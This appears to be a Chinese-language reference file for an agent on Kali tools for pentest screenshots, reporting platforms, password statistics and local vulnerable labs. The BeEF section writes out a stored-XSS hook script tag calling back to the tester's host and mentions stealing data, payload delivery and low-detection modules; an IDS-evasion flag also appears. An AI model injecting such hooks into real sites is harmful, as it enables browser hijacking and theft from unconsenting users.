# 报告、协同与靶场(Reporting, Collaboration & Labs)

> **何时读本文件**:当任务涉及渗透测试证据截图、报告/协作平台、密码转储统计分析、本地漏洞靶场(DVWA/Juice Shop)搭建,或 GVM/BeEF/TheHive 等平台服务启停时,读取本文件。

## 快速决策表

| 任务场景 | 首选工具 | 备选 | 关键区别 |
|---|---|---|---|
| 批量网站截图 + HTML 报告 | eyewitness | witnessme | EyeWitness 单命令出报告;WitnessMe 附带签名扫描/REST API/交互式结果库 |
| 单个 URL 快速截图(PNG/PDF/SVG) | cutycapt | `eyewitness --single` | cutycapt 基于 Qt WebKit 无需浏览器;现代重 JS 页面渲染不如 Selenium 系 |
| 大规模网段清点(CIDR/IP 段/Nessus) | witnessme | `eyewitness -x` | WitnessMe 原生吃 CIDR/IP 段/.nessus,默认扫 80/8080/443/8443 |
| 团队协作式渗透报告 | dradis | defectdojo / redeye | Dradis 轻量专注报告模板与协作;DefectDojo 偏漏洞管理与去重;RedEye 偏红队行动数据管理 |
| 漏洞管理平台(去重/JIRA/Slack 推送) | defectdojo | thehive | DefectDojo 偏 AppSec 漏洞库;TheHive 偏安全事件响应(case 管理) |
| 综合漏洞扫描平台(原 OpenVAS) | gvm | — | `gvm-setup` 首次初始化(下载 feed 耗时),之后 start/stop |
| 浏览器利用/客户端攻击框架 | beef-xss | — | hook.js 注入受控页面,3000 端口面板控制上线浏览器 |
| 密码转储统计分析 | pipal | — | 只统计不破解;top 密码/基础词/长度分布直接指导字典生成 |
| 本地 Web 靶场(PHP 经典漏洞,分难度) | dvwa | — | 42001 端口,admin/password,覆盖 SQLi/XSS/命令注入等 |
| 本地 Web 靶场(Node,OWASP Top 10+) | juice-shop | — | 42000 端口,零配置开箱即用 |
| 层级笔记/取证信息整理 | cherrytree | obsidian | CherryTree 单文件可加密适合项目笔记;Obsidian Markdown 生态适合长期知识库 |
| 桌面操作录屏取证 | recordmydesktop | — | 输出 Ogg Theora,配合 ffmpeg 转 mp4 |
| 命令速查与一键复制 | arsenal-ng | — | TUI 搜索 2800+ 预置渗透命令,支持变量替换 |

### 平台服务端口速查(均为 Kali 打包版,监听 127.0.0.1)

| 服务 | 启动 | 停止 | 地址 | 默认凭据 |
|---|---|---|---|---|
| dradis | `sudo dradis-start` | `sudo dradis-stop` | http://127.0.0.1:3000 | 首次启动按终端提示设置 |
| defectdojo | `sudo defectdojo-start` | `sudo defectdojo-stop` | http://127.0.0.1:42003 | admin + 首次启动随机生成的密码(终端只显示一次) |
| gvm (Greenbone) | `sudo gvm-start` | `sudo gvm-stop` | https://127.0.0.1:9392 | 首次访问 Web UI 时创建管理员 |
| beef-xss | `sudo beef-xss` | `sudo beef-xss-stop` | http://127.0.0.1:3000/ui/panel | beef / 首次启动强制改密 |
| thehive | `sudo thehive-start` | `sudo thehive-stop` | http://127.0.0.1:9000 | admin / secret |
| dvwa | `sudo dvwa-start` | `sudo dvwa-stop` | http://127.0.0.1:42001/login.php | admin / password |
| juice-shop | `sudo juice-shop` | `sudo juice-shop-stop` | http://127.0.0.1:42000 | 无需登录 |
| redeye | `sudo redeye-start` | `sudo redeye-stop` | http://127.0.0.1:8443 | 首次使用时设置 |

注意:dradis 与 beef-xss 默认都占用 3000 端口,同机使用需错开(先停一个,或改 BeEF 配置)。

## 核心工具详解

### eyewitness — 网站批量截图与快速分诊

**用途**:对 URL 列表 / Nmap XML / Nessus 文件批量截图,同时抓取 server header、页面标题,并基于内置签名识别已知应用与默认凭据,生成 HTML 报告。
**安装**:`sudo apt install eyewitness`
**使用场景**:信息收集后期,面对几十上百个 Web 服务需要快速挑出登录页、管理后台、老旧组件时首选;比 witnessme 更简单直接。

```bash
# 对 URL 列表截图并生成 HTML 报告(--no-prompt 避免交互提问)
eyewitness --web -f urls.txt -d <output-dir> --no-prompt

# 直接读取 Nmap XML 或 Nessus 扫描结果(按文件内容自动识别)
eyewitness --web -x nmap-scan.xml -d <output-dir> --no-prompt

# 单个目标
eyewitness --web --single http://<ip>:8080 --no-prompt

# 慢速目标:加大超时与重试、限制线程
eyewitness --web -f urls.txt --timeout 15 --max-retries 2 --threads 10 -d <output-dir>

# 所有截图流量走代理(结合 Burp 联动)
eyewitness --web -f urls.txt --proxy-ip 127.0.0.1 --proxy-port 8080 --proxy-type http

# 中断后从断点恢复
eyewitness --web --resume ew.db

# 自定义 UA / 附加 Cookie(访问需登录态的页面)
eyewitness --web -f urls.txt --user-agent "<ua-string>" --cookies key1=value1,key2=value2
```

**实战要点**:
- Kali 打包版的输出目录 `-d` 若用相对路径,报告会落在 `/usr/share/eyewitness/` 下,建议始终用绝对路径。
- `-f` 输入自动识别三种格式:每行一个 URL 的文本、Nmap XML(`-x`)、Nessus XML(`-x`);IP 网段类目标改用 witnessme 更合适。
- 报告为 `report.html`(含截图、标题、server header、默认凭据提示),按页面差异度排序可快速发现"长得一样"的默认页。
- `--jitter` 可随机化请求顺序并加随机延迟,降低对目标侧 IDS 的触发。

### cutycapt — 单页渲染截图(无浏览器依赖)

**用途**:调用 Qt WebKit 渲染网页并保存为 PNG/JPEG/PDF/SVG/PS/TIFF/GIF/BMP 等格式;轻量、无 GUI 也能跑。
**安装**:`sudo apt install cutycapt`
**使用场景**:只需对个别 URL 存证(如漏洞页面截图进报告),不值得起 Selenium 栈时用;需要矢量格式(PDF/SVG)嵌入报告时是唯一选择。

```bash
# 基本截图(官网示例)
cutycapt --url=http://<domain> --out=<file>.png

# 指定最小视口与最长等待时间
cutycapt --url=http://<ip>:8080 --out=app.png --min-width=1280 --min-height=800 --max-wait=15000

# 直接输出 PDF
cutycapt --url=https://<domain> --out=page.pdf

# 无显示环境的机器用 xvfb-run 包裹
xvfb-run --server-args="-screen 0, 1280x800x24" cutycapt --url=http://<domain> --out=<file>.png
```

**实战要点**:
- 输出格式由 `--out` 的扩展名决定,无需额外参数。
- 渲染引擎是 Qt WebKit,较老;现代 SPA/重 JS 页面可能渲染不全,此类目标换 eyewitness。
- `--delay=<ms>` 可在截图前等待,用于跳过加载动画;`--user-agent=` 与 `--http-proxy=<url>` 支持定制请求(如 `cutycapt --url=http://<domain> --out=<file>.png --http-proxy=http://127.0.0.1:8080`)。

### witnessme — 大规模 Web 资产清点与抓取

**用途**:基于无头 Chromium(pyppeteer)的 Web 清点工具,支持 CIDR/IP 段/Nessus/Nmap XML 混合输入,截图后可用 wmdb 交互式检索、签名扫描并导出 HTML/CSV 报告,还提供 REST API(wmapi)。
**安装**:`sudo apt install witnessme`
**使用场景**:内网大网段扫描后需要"哪些主机有 Web、是什么应用"的全景图;或需要 XPath 抓取 JS 渲染页面的内容。

```bash
# 混合输入:CIDR + IP 段 + URL + 文件(IP/CIDR 默认尝试 80/8080/443/8443)
witnessme screenshot 192.168.1.0/24 192.168.1.10-20 https://<domain> targets.txt

# 自定义端口
witnessme screenshot -p 80 8080 443 8443 10.0.0.0/24

# 从 stdin 读目标
cat urls.txt | witnessme screenshot -

# 渲染 JS 页面后按 XPath 抓取内容
witnessme grab -x '//div[@id="dns"]/table//tr/td[2]/a/text()' https://<domain>/path

# 抓取页面全部链接
witnessme grab -l https://<domain>

# 全部流量走 HTTP 代理
HTTP_PROXY=http://127.0.0.1:8080 witnessme screenshot targets.txt

# 扫描完成后在当前目录生成 scan_<时间戳>/ 目录,用 wmdb 浏览结果
wmdb scan_<timestamp>/
#   wmdb 内: servers tomcat     # 按 server/title 过滤服务
#   wmdb 内: hosts <ip>         # 查看主机及其服务
#   wmdb 内: scan               # 对全部服务跑签名扫描
#   wmdb 内: generate_report html   # 生成 HTML 报告(csv 可选)
```

**实战要点**:
- Nmap XML 必须以 `.xml` 结尾、Nessus 必须 `.nessus` 后缀,否则按普通文本解析。
- `--threads` 默认 15,每线程一个浏览器标签页,调太高会吃光内存并出现 Page Crash。
- `wmapi [host] [port]` 可把扫描能力暴露为 REST API(默认 127.0.0.1:8000,文档在 /docs),无任何鉴权,切勿对外监听。
- 签名是 YAML 文件(应用特征 + 默认凭据),可自行添加识别规则。

### pipal — 密码转储统计分析

**用途**:对密码文件(破解结果或字典)做统计:总数/去重数、top 密码、top 基础词、长度分布、字符构成比例,为下一步字典生成和密码策略评估提供依据。
**安装**:`sudo apt install pipal`
**使用场景**:拿到一批破解出的明文密码(hashcat/john 输出)后,量化分析口令规律;或评估客户环境口令强度写进报告。

```bash
# 分析文件并显示 top 5(官网示例,输入为 Kali 自带字典)
pipal -t 5 /usr/share/wordlists/nmap.lst

# 分析破解结果,显示 top 20,结果落盘
pipal -t 20 cracked.txt -o pipal-report.txt

# 查看可用的分析器及其启用状态
pipal --list-checkers

# 详细输出
pipal -v <file>
```

**实战要点**:
- 输入就是每行一个密码的纯文本;wordlist 里的 `#!comment:` 注释行同样会被统计(官网输出里即如此),正式分析前先 `grep -v '^#!'` 过滤。
- 处理大文件耗时,进度条期间按 Ctrl-C 可提前结束并输出已处理部分的统计。
- 重点看 "Top base words"(基础词)和长度分布:例如 6-8 位占 70% + love/angel/password 等基础词靠前,可直接推导 `基础词+年份` 规则去跑下一轮 hashcat。
- `--gkey <key>` 可配 Google Maps API key 做邮编归属统计(可选功能)。

### dradis — 渗透测试协作与报告平台

**用途**:开源协作框架:统一管理各测试者的笔记、扫描器导入(nmap/nessus/nikto 等插件)、方法论清单(issue 库复用),最终套模板一键生成报告。
**安装**:`sudo apt install dradis`
**使用场景**:多人团队项目需要共享实时进度与统一报告格式;单机作战想要结构化管理 findings 时也够用。

```bash
# 启动(首次运行初始化,终端提示设置账号凭据,并自动打开浏览器)
sudo dradis-start
# Web UI: http://127.0.0.1:3000

# 停止
sudo dradis-stop

# 等价的 systemd 操作
sudo systemctl start dradis
sudo systemctl status dradis
```

**实战要点**:
- 服务只监听 127.0.0.1:3000;远程团队协作用 SSH 隧道:`ssh -L 3000:127.0.0.1:3000 <user>@<server>`。
- 与 beef-xss 默认端口冲突(都是 3000),同机需先停一个。
- 工作流:建 Project → 导入扫描器结果为 Evidence → 归纳为 Issue(可复用库)→ 挂到 Methodology 清单 → 导出报告(HTML/Word 模板)。
- 默认绑定的凭据在首次启动的终端输出里,注意留存。

### defectdojo — 漏洞管理与安全编排平台

**用途**:应用安全漏洞管理平台:导入各类扫描器结果(100+ 解析器),启发式去重与降噪,维护产品/评估/测试对象层级,可将 findings 推送到 JIRA、Slack。
**安装**:`sudo apt install defectdojo`(体积大,依赖 PostgreSQL + Redis + celery)
**使用场景**:需要长期跟踪漏洞生命周期(从发现到修复验证)、多工具结果聚合去重、与研发工单系统联动时,比 dradis 更重但更"平台化"。

```bash
# 首次启动:自动建库、生成 admin 密码(只在终端显示一次,务必记录)
sudo defectdojo-start
# Web UI: http://127.0.0.1:42003  用户名: admin

# 忘记密码时直接建新超级用户
cd /usr/lib/defectdojo && sudo python3 manage.py createsuperuser

# 停止(含 uwsgi 与 celery worker/beat)
sudo defectdojo-stop
```

**实战要点**:
- 旧命令 `defectdojo` 已被 Kali 标记弃用,统一使用 `defectdojo-start`。
- 启动要拉起 postgresql、redis、celery 多个组件,42003 在初始化完成前可能无响应,等 1-2 分钟再访问。
- 结果导入优先走 API(可脚本化批量)或 Web UI 的 Import Scan;同型漏洞自动去重依赖 heuristic,导入后人工过一遍 dedupe 建议。
- 与 dradis 的分工:dradis 管"报告怎么写",DefectDojo 管"漏洞状态怎么流转"。

### gvm — Greenbone 漏洞管理系统(原 OpenVAS)

**用途**:全套开源漏洞扫描平台:gvmd(管理)+ ospd-openvas(扫描)+ notus-scanner(本地检查)+ gsad(Web 界面),对远程主机做已登录/未登录漏洞审计。
**安装**:`sudo apt install gvm`(元包)
**使用场景**:需要对整个网段做系统性 CVE 扫描、产出合规式漏洞报告(区别于渗透测试的手工验证)。

```bash
# 首次使用必须先初始化:建 PostgreSQL 库、生成证书、下载 NVT/feed(数据量大,耗时可能 30 分钟以上)
sudo gvm-setup

# 检查安装完整性(会给出具体修复命令)
sudo gvm-check-setup

# 证书缺失报错时按 check-setup 提示修复
sudo runuser -u _gvm -- gvm-manage-certs -a -f

# 启动/停止全套服务
sudo gvm-start     # Web UI: https://127.0.0.1:9392
sudo gvm-stop
```

**实战要点**:
- `gvm-setup` 没跑完之前 `gvm-start` 打开的页面无法登录;feed 下载失败多为网络问题,重跑 setup。
- Web UI 是自签 HTTPS 证书,浏览器告警需手动接受。
- 首次访问 https://127.0.0.1:9392 时通过引导页创建管理员账号。
- scan config 建议先用 "Full and fast" 做基线;带凭据扫描(Credentialed checks)结果质量远高于无凭据扫描。

### beef-xss — 浏览器利用框架(BeEF)

**用途**:通过向页面注入 hook.js 控制受害者浏览器:社工弹窗、内网探测、窃取信息、投递 payload,面板化管理上线浏览器与命令模块。
**安装**:`sudo apt install beef-xss`
**使用场景**:验证 XSS 的实际危害、客户端攻击演练、红队钓鱼演练中评估浏览器侧攻击面。

```bash
# 启动(首次运行强制把默认密码 beef 改掉,之后自动打开面板)
sudo beef-xss
# Web UI: http://127.0.0.1:3000/ui/panel
# Hook 脚本: http://<your-ip>:3000/hook.js

# 停止
sudo beef-xss-stop

# 修改监听地址/端口/凭据
sudo vi /etc/beef-xss/config.yaml
```

**实战要点**:
- hook 方式:在存在存储型 XSS 的页面注入 `<script src="http://<your-ip>:3000/hook.js"></script>`,或将其嵌入钓鱼页;上线浏览器出现在面板 "Online Browsers"。
- 受害机必须能回连 Kali 的 IP:3000;HTTPS 页面注入 HTTP hook 会被浏览器混合内容策略拦截,需用 HTTPS 反代 hook。
- 与 dradis 端口冲突(默认均 3000),同机部署先停一个或改配置。
- 测试客户端攻击链时优先用低检测度的命令模块(如 Social Engineering 系列),再逐步升级。

### dvwa — Damn Vulnerable Web Application 靶场

**用途**:PHP/MySQL 的"全身是洞"靶场:SQLi、XSS(反射/存储/DOM)、命令注入、文件上传、CSRF、暴力破解、文件包含等经典漏洞,每个模块带 Low→Impossible 四档难度与源码查看。
**安装**:`sudo apt install dvwa`(自动带 apache2/nginx + php + mariadb 依赖)
**使用场景**:练习手工注入与工具联调、验证扫描器效果、安全培训;比 juice-shop 更贴近传统 LAMP 技术栈。

```bash
# 启动(自动拉起 php-fpm、数据库并打开浏览器)
sudo dvwa-start
# Web UI: http://127.0.0.1:42001/login.php  默认 admin / password

# 首次登录后在首页点击 "Create / Reset Database" 初始化数据库,然后重新登录

# 停止
sudo dvwa-stop
```

**实战要点**:
- 左侧 DVWA Security 页切换 Low/Impossible 难度;PHPIDS 可开关,用于测试 WAF 类拦截。
- 与 Burp 联调:浏览器代理指向 127.0.0.1:8080 后所有模块(SQL 盲注、CSRF token 抓取)都能演练。
- 数据库重置会清空所有测试数据;`dvwa-stop` 后靶场数据保留在 mariadb 中。
- 官方警告:绝不能部署到公网服务器,本包仅监听本机回环。

### juice-shop — OWASP Juice Shop 靶场

**用途**:Node.js/Express 编写的现代不安全应用:覆盖 OWASP Top 10 及大量真实世界漏洞(SQL/NoSQL 注入、XSS、权限提升、JWT 滥用、业务逻辑漏洞等),内置记分板与 hacking instructor,适合 CTF 和工具试验。
**安装**:`sudo apt install juice-shop`(约 1 GB)
**使用场景**:练习现代 Web/API 攻击手法、新工具的"小白鼠"、安全意识演示;零配置开箱即用。

```bash
# 启动
sudo juice-shop
# Web UI: http://127.0.0.1:42000

# 停止
sudo juice-shop-stop
```

**实战要点**:
- 无需登录即可浏览商店;页面底部 "Score Board" 入口(或访问 /#/score-board)跟踪挑战进度。
- 官方警告:包含大量真实漏洞,绝不能放到公网或生产环境。
- 适合配合Burp/nuclei/SQLmap 演练:目标就是 http://127.0.0.1:42000。
- 与 dvwa 的分工:juice-shop 练现代栈(JSON API/JWT/前端),dvwa 练经典 LAMP。

### thehive — 安全事件响应平台

**用途**:SOC 案例(case)管理平台:警报聚合为 case、任务分派、observable 分析、与 Cortex/MISP 集成做自动化响应;Kali 打包的是 TheHive 4(Cassandra 后端)。
**安装**:`sudo apt install thehive`
**使用场景**:渗透/红队产出需要以事件流方式管理、或搭建小型 SOC 实验环境时。

```bash
# 首次启动:自动初始化 Cassandra(改集群名为 thp 并重启),非常慢,需数分钟
sudo thehive-start
# Web UI: http://127.0.0.1:9000  默认 admin / secret

# 停止
sudo thehive-stop
```

**实战要点**:
- 首次启动看到 "Please wait..." 属正常,卡在 cassandra 初始化,不要中途 Ctrl-C。
- 默认凭据 admin/secret,登录后立即修改。
- TheHive 5 上游未进 Kali 仓库,包为 4.1.x;5.x 需自行用官方 Docker 部署。
- 典型联动:thehive 收 case → Cortex 跑 analyzer → MISP 同步情报。

### cherrytree — 层级式渗透笔记

**用途**:单文档层级笔记应用:富文本 + 代码语法高亮 + 图片内嵌 + 超链接,整库保存为一个文件(.ctd XML 或 .cts SQLite),支持整库密码加密,可导出 PDF/HTML/TEXT。
**安装**:`sudo apt install cherrytree`
**使用场景**:单机项目作战笔记、CVE/PoC 资料整理、凭证与 host 清单记录;不想为记笔记起 Web 服务时用它,多人协作换 dradis。

```bash
# 启动 GUI,直接打开指定笔记库
cherrytree <file>.ctd
```

**实战要点**:
- .cts(SQLite)+ 密码加密适合存放含敏感信息的渗透笔记;记得备份单文件即备份全部。
- 节点树按 " Recon / Enumeration / Exploitation / Report " 组织,配合代码高亮节点贴命令与输出,是写报告时的素材源。
- 支持从 KeepNote、Zim、Tomboy、Evernote 等格式导入;导出 PDF 可直接作为附件交付。
- 与 obsidian 的取舍:cherrytree 是单文件封闭数据库,obsidian 是纯 Markdown 文件夹(可 git 版本化)。

### redeye — 红队行动数据管理

**用途**:渗透/红队行动期间的攻击数据管理:主机、服务、凭证、截屏、命令输出集中组织,辅助生成行动报告。
**安装**:`sudo apt install redeye`
**使用场景**:红队多日行动中管理海量 C2/扫描输出,需要快速回溯"哪台机器用什么凭据打通了什么路径"时。

```bash
# 启动(浏览器可能需要手动刷新一次)
sudo redeye-start
# Web UI: http://127.0.0.1:8443

# 停止
sudo redeye-stop
```

**实战要点**:
- 旧命令 `redeye` 已弃用,统一用 `redeye-start`。
- 数据模型围绕"攻击行动(campaign)→ 主机 → 凭证/附件"组织,与 Cobalt Strike 类日志配合使用顺手。
- 仅监听本机,远程访问用 SSH 隧道转发 8443。

### recordmydesktop — 桌面录屏取证

**用途**:录制 Linux 桌面会话为 Ogg Theora 视频(可含 Vorbis 音频),只重编码变化区域故开销低。
**安装**:`sudo apt install recordmydesktop`
**使用场景**:漏洞复现录屏、PoC 演示、培训录像;作为渗透报告的证据链补充。

```bash
# 录制全屏(Ctrl+Mod1+p 暂停,Ctrl+Mod1+s 停止并保存)
recordmydesktop -o session.ogv

# 无声音,只录指定矩形区域
recordmydesktop -o demo.ogv --no-sound -x 100 -y 100 --width 1024 --height 768

# 限制帧率 + 即时编码(降低 CPU 与临时盘占用)
recordmydesktop -o demo.ogv --fps 15 --on-the-fly-encoding --no-sound

# 交付前转成 mp4
ffmpeg -i demo.ogv demo.mp4
```

**实战要点**:
- 默认快捷键 Mod1 即 Alt:Ctrl+Alt+p 暂停/恢复,Ctrl+Alt+s 停止。
- 默认只捕获变化区域,快速全屏动画(视频播放、页面滚动)会糊,此时加 `--full-shots`。
- ogv 格式多数客户环境不便播放,统一用 ffmpeg 转 mp4 后再入报告。

### arsenal-ng — 渗透命令速查库(TUI)

**用途**:内置 2800+ 条按工具组织的渗透命令模板(403bypasser、AD-miner 等 200+ 工具的 cheat sheet),终端内模糊搜索、变量替换、一键复制。
**安装**:`sudo apt install arsenal-ng`
**使用场景**:想不起某工具完整参数组合时,比翻 man 快;统一管理自己的常用 payload。

```bash
# 启动 TUI,键入关键字过滤命令列表
arsenal-ng
#   界面内: set host=10.10.10.10     # 定义变量,命令模板自动替换
#           unset host               # 清除变量
#           variables                # 查看已定义变量
#           ↑/↓ 选择,回车复制到剪贴板,esc 退出
```

**实战要点**:
- 命令带标签(bypass/reconnaissance/active-directory 等),用标签词搜索更准。
- 复制得到的命令仍需人工核对参数与目标值,再执行。
- 本质是"记忆外挂",与 pipal/eyewitness 等无耦合,任何阶段都能用。

## 其余工具速查

| 工具 | 一句话用途 | 安装包 | 最常用命令 |
|---|---|---|---|
| obsidian | 本地优先的 Markdown 知识库笔记(插件生态) | obsidian | `obsidian` |
| kali-tweaks | Kali 系统配置菜单(镜像源/代理/元包/加固选项) | kali-tweaks | `sudo kali-tweaks` |
| gemini-cli | 终端内的 Gemini AI agent(交互/非交互) | gemini-cli | `gemini-cli -p "<prompt>"`(非交互模式) |
| shell-gpt | LLM 生成 shell 命令与代码片段(需 OPENAI_API_KEY) | shell-gpt | `sgpt --shell "<用自然语言描述要执行的命令>"` |
| portspoof | 反扫描伪装:65535 端口全开 + 动态假 banner 迷惑扫描器 | portspoof | `sudo portspoof-start` / `sudo portspoof-stop`(使用前需按其文档配置) |
| faraday | 多用户渗透协作/编排平台 | faraday | `faraday`(同类备选:dradis / defectdojo / redeye) |

---

仅用于已获书面授权的渗透测试、CTF 竞赛与安全教育场景。
